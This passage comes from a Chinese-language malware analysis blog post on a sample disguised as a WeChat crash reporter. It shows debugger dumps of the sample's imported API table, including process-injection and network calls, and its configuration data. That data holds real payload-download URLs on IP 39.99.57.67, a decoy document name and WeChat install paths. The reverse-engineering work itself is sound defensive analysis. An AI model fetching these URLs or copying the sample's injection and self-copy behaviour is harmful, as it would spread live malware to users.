class=\"number\">757E2</span>E90  kernel32.CreateEventA</span><br><span class=\"line\">$+A4      <span class=\"number\">757E0</span>E70  kernel32.CreateThread</span><br><span class=\"line\">$+A8      <span class=\"number\">757E2</span>FE0  kernel32.SetEvent</span><br><span class=\"line\">$+AC      <span class=\"number\">757</span>D92B0  kernel32.OutputDebugStringA</span><br><span class=\"line\">$+B0      <span class=\"number\">757E2300</span>  kernel32.GetTickCount</span><br><span class=\"line\">$+B4      <span class=\"number\">757</span>D2EB0  kernel32.FindResourceA</span><br><span class=\"line\">$+B8      <span class=\"number\">757E03</span>E0  kernel32.SizeofResource</span><br><span class=\"line\">$+BC      <span class=\"number\">757</span>DE7A0  kernel32.LoadResource</span><br><span class=\"line\">$+C0      <span class=\"number\">757</span>DF2A0  kernel32.LockResource</span><br><span class=\"line\">$+C4      <span class=\"number\">757F</span>4B10  kernel32.SetCurrentDirectoryA</span><br><span class=\"line\">$+C8      <span class=\"number\">7581</span>CD60  kernel32.WinExec</span><br><span class=\"line\">$+CC      <span class=\"number\">757</span>DF4B0  kernel32.GetProcAddress</span><br><span class=\"line\">$+D0      <span class=\"number\">757E2</span>DF0  kernel32.GetCurrentProcessId</span><br><span class=\"line\">$+D4      <span class=\"number\">757</span>DDE70  kernel32.GetCurrentThreadId</span><br><span class=\"line\">$+D8      <span class=\"number\">757F</span>2D80  kernel32.CreatePipe</span><br><span class=\"line\">$+DC      <span class=\"number\">757E3010</span>  kernel32.WaitForMultipleObjects</span><br><span class=\"line\">$+E0      <span class=\"number\">757E2</span>FD0  kernel32.ResetEvent</span><br><span class=\"line\">$+E4      <span class=\"number\">757E0</span>AF0  kernel32.ProcessIdToSessionId</span><br><span class=\"line\">$+E8      <span class=\"number\">757E1</span>E10  kernel32.GetNativeSystemInfo</span><br><span class=\"line\">$+EC      <span class=\"number\">757E0640</span>  kernel32.IsWow64Process</span><br><span class=\"line\">$+F0      <span class=\"number\">757E2</span>DE0  kernel32.GetCurrentProcess</span><br><span class=\"line\">$+F4      <span class=\"number\">757F</span>2DA0  kernel32.CreateProcessA</span><br><span class=\"line\">$+F8      <span class=\"number\">757</span>D9870  kernel32.TerminateProcess</span><br><span class=\"line\">$+FC      <span class=\"number\">757F</span>5000  kernel32.VirtualAllocEx</span><br><span class=\"line\">$+<span class=\"number\">100</span>     <span class=\"number\">757F</span>5250  kernel32.WriteProcessMemory</span><br><span class=\"line\">$+<span class=\"number\">104</span>     <span class=\"number\">757F</span>2E40  kernel32.CreateRemoteThread</span><br><span class=\"line\">$+<span class=\"number\">108</span>     <span class=\"number\">757E0590</span>  kernel32.OpenProcess</span><br><span class=\"line\">$+<span class=\"number\">10</span>C     <span class=\"number\">757F</span>4B70  kernel32.SetEnvironmentVariableA</span><br><span class=\"line\">$+<span class=\"number\">110</span>     <span class=\"number\">757F</span>3550  kernel32.GetEnvironmentStrings</span><br><span class=\"line\">$+<span class=\"number\">114</span>     <span class=\"number\">757E3390</span>  kernel32.GetVolumeInformationA</span><br><span class=\"line\">$+<span class=\"number\">118</span>     <span class=\"number\">757</span>D8FE0  kernel32.GetComputerNameA</span><br><span class=\"line\">$+<span class=\"number\">11</span>C     <span class=\"number\">757E16</span>C0  kernel32.GetVersionExA</span><br><span class=\"line\">$+<span class=\"number\">120</span>     <span class=\"number\">757E0</span>BE0  kernel32.GetStartupInfoA</span><br><span class=\"line\">$+<span class=\"number\">124</span>     <span class=\"number\">757</span>D83E0  kernel32.GetSystemDirectoryA</span><br><span class=\"line\">$+<span class=\"number\">128</span>     <span class=\"number\">757E34</span>C0  kernel32.SetFilePointerEx</span><br><span class=\"line\">$+<span class=\"number\">12</span>C     <span class=\"number\">757E32</span>D0  kernel32.GetFileSizeEx</span><br><span class=\"line\">$+<span class=\"number\">130</span>     <span class=\"number\">757E32</span>E0  kernel32.GetFileTime</span><br><span class=\"line\">$+<span class=\"number\">134</span>     <span class=\"number\">757E34</span>D0  kernel32.SetFileTime</span><br><span class=\"line\">$+<span class=\"number\">138</span>     <span class=\"number\">757E22</span>D0  kernel32.ExpandEnvironmentStringsA</span><br><span class=\"line\">$+<span class=\"number\">13</span>C     <span class=\"number\">757E30</span>C0  kernel32.DeleteFileA</span><br><span class=\"line\">$+<span class=\"number\">140</span>     <span class=\"number\">757E34</span>B0  kernel32.SetFilePointer</span><br><span class=\"line\">$+<span class=\"number\">144</span>     <span class=\"number\">757E09</span>C0  kernel32.GetModuleHandleA</span><br><span class=\"line\">$+<span class=\"number\">148</span>     <span class=\"number\">757E0</span>DB0  kernel32.GetModuleHandleW</span><br><span class=\"line\">$+<span class=\"number\">14</span>C     <span class=\"number\">757E07</span>C0  kernel32.GetEnvironmentVariableW</span><br><span class=\"line\">$+<span class=\"number\">150</span>     <span class=\"number\">757E1</span>E40  kernel32.GetCommandLineA</span><br><span class=\"line\">$+<span class=\"number\">154</span>     <span class=\"number\">757</span>D9420  kernel32.GetExitCodeProcess</span><br><span class=\"line\">$+<span class=\"number\">158</span>     <span class=\"number\">757E1850</span>  kernel32.ResumeThread</span><br><span class=\"line\">$+<span class=\"number\">15</span>C     <span class=\"number\">757</span>DF2F0  kernel32.GetSystemTimeAsFileTime</span><br><span class=\"line\">$+<span class=\"number\">160</span>     <span class=\"number\">757E2</span>ED0  kernel32.CreateMutexA</span><br><span class=\"line\">$+<span class=\"number\">164</span>     <span class=\"number\">757</span>D8AC0  kernel32.CopyFileA</span><br><span class=\"line\">$+<span class=\"number\">168</span>     <span class=\"number\">757E3060</span>  kernel32.CreateDirectoryA</span><br><span class=\"line\">$+<span class=\"number\">16</span>C     <span class=\"number\">757E2040</span>  kernel32.GetExitCodeThread</span><br><span class=\"line\">$+<span class=\"number\">170</span>     <span class=\"number\">757</span>DF490  kernel32.LocalFree</span><br><span class=\"line\">$+<span class=\"number\">174</span>     <span class=\"number\">757</span>DDF50  kernel32.WideCharToMultiByte</span><br><span class=\"line\">$+<span class=\"number\">178</span>     <span class=\"number\">75130000</span>  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">17</span>C     <span class=\"number\">75155840</span>  user32.wsprintfA</span><br><span class=\"line\">$+<span class=\"number\">180</span>     <span class=\"number\">76</span>EE6640  ntdll.NtdllDefWindowProc_A</span><br><span class=\"line\">$+<span class=\"number\">184</span>     <span class=\"number\">7514F</span>150  user32.RegisterClassA</span><br><span class=\"line\">$+<span class=\"number\">188</span>     <span class=\"number\">75155580</span>  user32.CreateWindowExA</span><br><span class=\"line\">$+<span class=\"number\">18</span>C     <span class=\"number\">7516F</span>7E0  user32.ShowWindow</span><br><span class=\"line\">$+<span class=\"number\">190</span>     <span class=\"number\">75161970</span>  user32.UpdateWindow</span><br><span class=\"line\">$+<span class=\"number\">194</span>     <span class=\"number\">75150B</span>90  user32.GetMessageA</span><br><span class=\"line\">$+<span class=\"number\">198</span>     <span class=\"number\">75167660</span>  user32.TranslateMessage</span><br><span class=\"line\">$+<span class=\"number\">19</span>C     <span class=\"number\">75154</span>EC0  user32.DispatchMessageA</span><br><span class=\"line\">$+<span class=\"number\">1</span>A0     <span class=\"number\">75159350</span>  user32.CharUpperA</span><br><span class=\"line\">$+<span class=\"number\">1</span>A4     <span class=\"number\">751</span>AD860  user32.MessageBoxA</span><br><span class=\"line\">$+<span class=\"number\">1</span>A8     <span class=\"number\">751527</span>A0  user32.GetCursorPos</span><br><span class=\"line\">$+<span class=\"number\">1</span>AC     <span class=\"number\">751B</span>7170  user32.FindWindowExA</span><br><span class=\"line\">$+<span class=\"number\">1B</span>0     <span class=\"number\">75167</span>AF0  user32.GetWindowThreadProcessId</span><br><span class=\"line\">$+<span class=\"number\">1B</span>4     <span class=\"number\">75161</span>ED0  user32.GetWindowRect</span><br><span class=\"line\">$+<span class=\"number\">1B</span>8     <span class=\"number\">751660B</span>0  user32.ScreenToClient</span><br><span class=\"line\">$+<span class=\"number\">1B</span>C     <span class=\"number\">75162150</span>  user32.GetClientRect</span><br><span class=\"line\">$+<span class=\"number\">1</span>C0     <span class=\"number\">75154080</span>  user32.SetWindowTextA</span><br><span class=\"line\">$+<span class=\"number\">1</span>C4     <span class=\"number\">7516F</span>040  user32.MoveWindow</span><br><span class=\"line\">$+<span class=\"number\">1</span>C8     <span class=\"number\">751525B</span>0  user32.GetAsyncKeyState</span><br><span class=\"line\">$+<span class=\"number\">1</span>CC     <span class=\"number\">76580000</span>  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">1</span>D0     <span class=\"number\">7659F</span>620  advapi32.SetServiceStatus</span><br><span class=\"line\">$+<span class=\"number\">1</span>D4     <span class=\"number\">7659F</span>8A0  advapi32.RegisterServiceCtrlHandlerW</span><br><span class=\"line\">$+<span class=\"number\">1</span>D8     <span class=\"number\">7659</span>DF20  advapi32.OpenProcessToken</span><br><span class=\"line\">$+<span class=\"number\">1</span>DC     <span class=\"number\">765</span>A3910  advapi32.LookupPrivilegeValueA</span><br><span class=\"line\">$+<span class=\"number\">1E0</span>     <span class=\"number\">7659</span>EF80  advapi32.AdjustTokenPrivileges</span><br><span class=\"line\">$+<span class=\"number\">1E4</span>     <span class=\"number\">765B</span>2990  advapi32.CreateProcessAsUserA</span><br><span class=\"line\">$+<span class=\"number\">1E8</span>     <span class=\"number\">7659E7</span>E0  advapi32.InitializeSecurityDescriptor</span><br><span class=\"line\">$+<span class=\"number\">1</span>EC     <span class=\"number\">7659E7</span>C0  advapi32.InitializeAcl</span><br><span class=\"line\">$+<span class=\"number\">1F</span>0     <span class=\"number\">765</span>C45D0  advapi32.LookupAccountNameA</span><br><span class=\"line\">$+<span class=\"number\">1F</span>4     <span class=\"number\">7659E660</span>  advapi32.AddAccessAllowedAce</span><br><span class=\"line\">$+<span class=\"number\">1F</span>8     <span class=\"number\">7659E640</span>  advapi32.SetSecurityDescriptorDacl</span><br><span class=\"line\">$+<span class=\"number\">1F</span>C     <span class=\"number\">765</span>A2840  advapi32.GetUserNameA</span><br><span class=\"line\">$+<span class=\"number\">200</span>     <span class=\"number\">75530000</span>  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">204</span>     <span class=\"number\">755</span>A59A0  msvcrt.<span class=\"built_in\">sscanf</span></span><br><span class=\"line\">$+<span class=\"number\">208</span>     <span class=\"number\">755B</span>94D0  msvcrt.<span class=\"built_in\">memset</span></span><br><span class=\"line\">$+<span class=\"number\">20</span>C     <span class=\"number\">755B</span>8CF0  msvcrt.<span class=\"built_in\">memcpy</span></span><br><span class=\"line\">$+<span class=\"number\">210</span>     <span class=\"number\">755</span>A4CB0  msvcrt.<span class=\"built_in\">printf</span></span><br><span class=\"line\">$+<span class=\"number\">214</span>     <span class=\"number\">75596</span>C30  msvcrt._beginthreadex</span><br><span class=\"line\">$+<span class=\"number\">218</span>     <span class=\"number\">755B</span>9EF0  msvcrt.strtok</span><br><span class=\"line\">$+<span class=\"number\">21</span>C     <span class=\"number\">755B</span>9E60  msvcrt.<span class=\"built_in\">strstr</span></span><br><span class=\"line\">$+<span class=\"number\">220</span>     <span class=\"number\">755B</span>F140  msvcrt._time64</span><br><span class=\"line\">$+<span class=\"number\">224</span>     <span class=\"number\">7558</span>C650  msvcrt.rand</span><br><span class=\"line\">$+<span class=\"number\">228</span>     <span class=\"number\">7558B</span>AB0  <span class=\"string\">&quot;j\\fh垜]u鐷\\x11&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">22</span>C     <span class=\"number\">755774F</span>0  msvcrt.<span class=\"built_in\">malloc</span></span><br><span class=\"line\">$+<span class=\"number\">230</span>     <span class=\"number\">7558</span>C680  msvcrt.srand</span><br><span class=\"line\">$+<span class=\"number\">234</span>     <span class=\"number\">75577310</span>  msvcrt.<span class=\"built_in\">free</span></span><br><span class=\"line\">$+<span class=\"number\">238</span>     <span class=\"number\">76E60000</span>  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">23</span>C     <span class=\"number\">76</span>EBE1D0  ntdll.RtlInitializeCriticalSection</span><br><span class=\"line\">$+<span class=\"number\">240</span>     <span class=\"number\">76E9</span>E8E0  ntdll.RtlEnterCriticalSection</span><br><span class=\"line\">$+<span class=\"number\">244</span>     <span class=\"number\">76E9</span>DE00  ntdll.RtlLeaveCriticalSection</span><br><span class=\"line\">$+<span class=\"number\">248</span>     <span class=\"number\">76</span>EAF940  ntdll.RtlDeleteCriticalSection</span><br><span class=\"line\">$+<span class=\"number\">24</span>C     <span class=\"number\">746</span>A0000  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">250</span>     <span class=\"number\">746</span>A4FD0  wtsapi32.WTSEnumerateSessionsA</span><br><span class=\"line\">$+<span class=\"number\">254</span>     <span class=\"number\">746</span>A53A0  wtsapi32.WTSQuerySessionInformationA</span><br><span class=\"line\">$+<span class=\"number\">258</span>     <span class=\"number\">746</span>A24A0  wtsapi32.WTSFreeMemory</span><br><span class=\"line\">$+<span class=\"number\">25</span>C     <span class=\"number\">746</span>A1930  wtsapi32.QueryUserToken</span><br><span class=\"line\">$+<span class=\"number\">260</span>     <span class=\"number\">75</span>C60000  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">264</span>     <span class=\"number\">75</span>DBA520  shell32.CommandLineToArgvW</span><br><span class=\"line\">$+<span class=\"number\">268</span>     <span class=\"number\">75E97</span>CF0  shell32.ShellExecuteA</span><br><span class=\"line\">$+<span class=\"number\">26</span>C     <span class=\"number\">76250000</span>  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">270</span>     <span class=\"number\">7626</span>A1C0  shlwapi.PathFileExistsA</span><br><span class=\"line\">$+<span class=\"number\">274</span>     <span class=\"number\">73B</span>20000  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">278</span>     <span class=\"number\">73</span>DC1380  wininet.InternetOpenA</span><br><span class=\"line\">$+<span class=\"number\">27</span>C     <span class=\"number\">73</span>DD8640  wininet.InternetQueryOptionA</span><br><span class=\"line\">$+<span class=\"number\">280</span>     <span class=\"number\">73</span>DDA4B0  wininet.InternetSetOptionA</span><br><span class=\"line\">$+<span class=\"number\">284</span>     <span class=\"number\">73E27000</span>  wininet.InternetConnectA</span><br><span class=\"line\">$+<span class=\"number\">288</span>     <span class=\"number\">73</span>DD7D50  wininet.InternetReadFile</span><br><span class=\"line\">$+<span class=\"number\">28</span>C     <span class=\"number\">73</span>DE2950  wininet.InternetCloseHandle</span><br><span class=\"line\">$+<span class=\"number\">290</span>     <span class=\"number\">73</span>EC41F0  wininet.HttpOpenRequestA</span><br><span class=\"line\">$+<span class=\"number\">294</span>     <span class=\"number\">73</span>DF00F0  wininet.HttpAddRequestHeadersA</span><br><span class=\"line\">$+<span class=\"number\">298</span>     <span class=\"number\">73E32</span>B20  wininet.HttpSendRequestA</span><br><span class=\"line\">$+<span class=\"number\">29</span>C     <span class=\"number\">73</span>DD9EE0  wininet.HttpQueryInfoA</span><br><span class=\"line\">$+<span class=\"number\">2</span>A0     <span class=\"number\">6F</span>780000  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">2</span>A4     <span class=\"number\">6F</span>7D19B0  dnsapi.DnsGetCacheDataTable</span><br><span class=\"line\">$+<span class=\"number\">2</span>A8     <span class=\"number\">6F</span>7A1DE0  dnsapi.DnsFree</span><br><span class=\"line\">$+<span class=\"number\">2</span>AC     <span class=\"number\">6F</span>793530  dnsapi.DnsQuery_W</span><br></pre></td></tr></table></figure>\n\n<p>最后初始化的是一个样本之后用到的数据，包括有创建文件的路径，自拷贝的路径等等。该函数是直接赋值，这里直接贴出他的内容。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ==&gt;     <span class=\"number\">00000201</span>  </span><br><span class=\"line\">$+<span class=\"number\">4</span>       <span class=\"number\">00000066</span>  </span><br><span class=\"line\">$+<span class=\"number\">8</span>       <span class=\"number\">00000002</span>  </span><br><span class=\"line\">$+C       <span class=\"number\">00000065</span>  </span><br><span class=\"line\">$+<span class=\"number\">10</span>      <span class=\"number\">00000001</span>  </span><br><span class=\"line\">$+<span class=\"number\">14</span>      <span class=\"number\">0123</span>A601  </span><br><span class=\"line\">$+<span class=\"number\">18</span>      <span class=\"number\">02</span>D91248  <span class=\"string\">&quot;D:\\\\Tencent\\\\WeChat\\\\v7.0\\nD:\\\\Tencent\\\\WeChat\\\\v7.0\\n%ProgramData%\\\\Tencent\\\\WeChat\\n&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">1</span>C      <span class=\"number\">02</span>D92448  <span class=\"string\">&quot;CrashReporter.exe&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">20</span>      <span class=\"number\">02</span>D92478  <span class=\"string\">&quot;%PUBLIC%\\\\unlimit.flag&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">24</span>      <span class=\"number\">76</span>ED9800  <span class=\"string\">&quot;鶅&#125;\\x08&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">28</span>      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+<span class=\"number\">2</span>C      <span class=\"number\">02</span>D924A8  <span class=\"string\">&quot;%PUBLIC%\\\\Documents&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">30</span>      <span class=\"number\">02</span>D924D8  <span class=\"string\">&quot;new.doc&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">34</span>      <span class=\"number\">76</span>EA0100  ntdll<span class=\"number\">.76</span>EA0100</span><br><span class=\"line\">$+<span class=\"number\">38</span>      <span class=\"number\">02</span>D924F8  <span class=\"string\">&quot;%ProgramData%\\\\WeiXinCR01&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">3</span>C      <span class=\"number\">02</span>D92530  <span class=\"string\">&quot;%ProgramData%\\\\WeiXinCR02&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">40</span>      <span class=\"number\">00000001</span>  </span><br><span class=\"line\">$+<span class=\"number\">44</span>      <span class=\"number\">00000014</span>  </span><br><span class=\"line\">$+<span class=\"number\">48</span>      <span class=\"number\">00000064</span>  </span><br><span class=\"line\">$+<span class=\"number\">4</span>C      <span class=\"number\">02</span>D92884  </span><br><span class=\"line\">$+<span class=\"number\">50</span>      <span class=\"number\">02</span>D928A8  <span class=\"string\">&quot;Microsoft Word&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">54</span>      <span class=\"number\">02</span>D928B7  </span><br><span class=\"line\">$+<span class=\"number\">58</span>      <span class=\"number\">00000064</span>  </span><br><span class=\"line\">$+<span class=\"number\">5</span>C      <span class=\"number\">0000000</span>A  </span><br><span class=\"line\">$+<span class=\"number\">60</span>      <span class=\"number\">01200200</span>  </span><br><span class=\"line\">$+<span class=\"number\">64</span>      <span class=\"number\">02</span>D925E8  <span class=\"string\">&quot;127.0.0.\\n.0.0.127\\n192.168.\\n172.16.\\n0.0.0.0\\n255.255.255.255\\n&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">68</span>      <span class=\"number\">02</span>D92640  <span class=\"string\">&quot;.test\\ntest.\\n&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">6</span>C      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+<span class=\"number\">70</span>      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+<span class=\"number\">74</span>      <span class=\"number\">00000001</span>  </span><br><span class=\"line\">$+<span class=\"number\">78</span>      <span class=\"number\">00000301</span>  </span><br><span class=\"line\">$+<span class=\"number\">7</span>C      <span class=\"number\">0001</span>D4C0  </span><br><span class=\"line\">$+<span class=\"number\">80</span>      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+<span class=\"number\">84</span>      <span class=\"number\">00000B</span>B8  </span><br><span class=\"line\">$+<span class=\"number\">88</span>      <span class=\"number\">00026000</span>  </span><br><span class=\"line\">$+<span class=\"number\">8</span>C      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+<span class=\"number\">90</span>      <span class=\"number\">02</span>D92668  <span class=\"string\">&quot;WeiXinCrashReporter&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">94</span>      <span class=\"number\">02</span>D92698  <span class=\"string\">&quot;https://start.firefoxchina.cn\\nhttps://www.msn.cn/zh-cn\\n&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">98</span>      <span class=\"number\">02</span>D928BC  <span class=\"string\">&quot;http://39.99.57.67/grief-seed/ribbon-mummy.dat\\nhttp://39.99.57.67/grief-seed/marmaid-conductor.dat\\nhttp://39.99.57.67/grief-seed/candle-knight.dat\\nhttp://39.99.57.67/grief-seed/gramphone-witch.dat\\n&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">9</span>C      <span class=\"number\">00001388</span>  </span><br><span class=\"line\">$+A0      <span class=\"number\">00007530</span>  </span><br><span class=\"line\">$+A4      <span class=\"number\">00000001</span>  </span><br><span class=\"line\">$+A8      <span class=\"number\">02</span>D92982  <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.104 Safari/537.36 Edg/89.0.774.76&quot;</span></span><br><span class=\"line\">$+AC      <span class=\"number\">02</span>D92750  <span class=\"string\">&quot;###@@@WeiXin0099&quot;</span></span><br><span class=\"line\">$+B0      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+B4      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+B8      <span class=\"number\">00000003</span>  </span><br><span class=\"line\">$+BC      <span class=\"number\">02</span>D92A06  </span><br><span class=\"line\">$+C0      <span class=\"number\">02</span>D92A09  <span class=\"string\">&quot;0d8d26376410b051421adee91163c5a54a5d5095d47cdf05ae5351de7ba0a153382c6d5778c21726&quot;</span></span><br><span class=\"line\">$+C4      <span class=\"number\">00</span>EFF320  </span><br><span class=\"line\">$+C8      <span class=\"number\">00000F</span>DC  </span><br><span class=\"line\">$+CC      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+D0      <span class=\"number\">01200000</span>  </span><br><span class=\"line\">$+D4      <span class=\"number\">00001F</span>18  </span><br><span class=\"line\">$+D8      <span class=\"number\">00</span>DEF000  </span><br><span class=\"line\">$+DC      <span class=\"number\">01200000</span>  </span><br><span class=\"line\">$+E0      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+E4      <span class=\"number\">01200000</span>  </span><br><span class=\"line\">$+E8      <span class=\"number\">00</span>EFF390  </span><br><span class=\"line\">$+EC      <span class=\"number\">00001F</span>18  </span><br><span class=\"line\">$+F0      <span class=\"number\">00001F</span>18  </span><br><span class=\"line\">$+F4      <span class=\"number\">00001F</span>18  </span><br><span class=\"line\">$+F8      <span class=\"number\">00</span>DEF000  </span><br><span class=\"line\">$+FC      <span class=\"number\">00000000</span>  </span><br><span class=\"line\">$+<span class=\"number\">100</span>     <span class=\"number\">00000000</span></span><br></pre></td></tr></table></figure>\n\n<p>这里可以看到存在协议头，域名和IP列表，但是网络工具并没有监测到，说明样本没有触发。</p>\n<p>StartMainWork函数头首先是一个调用ExpandEnvironmentStringsA函数，来获取环境变量的值。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>通过前面他初始化的字符串得知这里的环境值为 %PUBLIC%\\unlimit.flag,因为这个文件一直不存在，所以紧接着的PathFileExistsA返回0,不进入代码块。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>然后会对本层函数传进来的参数进行判断，因为打开程序时默认不带有命令参数，所以CmdLine为NULL。又因为上面判断flag文件不存在，所以对应的标志位也是为0。此处判断不成立。往下走会判断dataTable + 0x14位置的值是否为0。通过查看dataTable发现这个位置的值恒等于1，所以此处永远是执行的状态。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>进行自我复制的操作。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>因为v73在上面的if没有成立，所以此处的值为默认的1，故此处调用的后两个参数为1,0。然后整个WinMain的执行周期结束。明显关键函数为<strong>CopySelf_And_DoWork</strong>，接下来进入分析。</p>\n<h2 id=\"2-CopySelf-And-DoWork分析\"><a href=\"#2-CopySelf-And-DoWork分析\" class=\"headerlink\" title=\"[2]CopySelf_And_DoWork分析\"></a>[2]CopySelf_And_DoWork分析</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>进入函数后首先会调用一个<strong>popMsgBox_DnsCache</strong>,这个函数的是跳出一个信息框然后进行<strong>DNS</strong>一些查询操作。这里注意的是ida在这里显示的是+0xE的作为参数一，可是在我调试的时候发现这里实际上是0x38，具体原因是啥，我也不清楚。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>现在继续往下看看还会执行什么。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>这里会执行两个函数，通过动态调试得知这里的参数内容如下</p>\n<p>pathTable &#x3D; “D:\\Tencent\\WeChat\\v7.0\\nD:\\Tencent\\WeChat\\v7.0\\n%ProgramData%\\Tencent\\WeChat\\n”</p>\n<p>ExistPath &#x3D; 上面一个函数创建new出来的地址，用于此处函数的out_buffer</p>\n<p>经过内部分析，这个函数作为为对参数一的路径以<strong>\\r\\n</strong>分割，然后逐一判断其是否存在，存在则返回到<strong>ExistPath</strong>。参数三的作用则是，传入0就直接判断路径是否存在，不创建。传入1就是如果路径不存在则创建。因为本人虚拟机只有C盘，故只有第三项路径存在<strong>C:\\ProgramData\\Tencent\\WeChat</strong>。如果所有路径都不存在，则本层函数直接返回，反之执行下列代码。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<p>图片可能有点乱，大概的流程就是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( GetModuleFileNameA(<span class=\"number\">0</span>, &amp;currentPath, <span class=\"number\">259</span>) )<span class=\"comment\">// 